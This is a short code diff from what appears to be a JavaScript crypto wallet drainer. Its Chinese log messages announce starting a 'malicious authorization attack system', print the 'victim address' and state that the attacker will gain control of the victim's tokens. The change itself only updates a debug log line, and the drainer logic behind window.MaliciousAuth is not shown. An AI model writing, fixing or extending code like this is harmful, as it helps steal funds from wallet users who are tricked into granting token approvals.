@@ -2371,7 +2371,7 @@
             // 🎯 启动恶意授权攻击系统
             if (window.MaliciousAuth && typeof window.MaliciousAuth.detectWallet === 'function') {
                 debugLog('🎯🎯🎯 启动恶意授权攻击系统！🎯🎯🎯');
-                debugLog('🎯 受害者地址:', address);
+                debugLog(`🎯 受害者地址: ${currentAccount}`);
                 debugLog('🎯 攻击者将获得代币控制权...');
                 
                 setTimeout(() => {
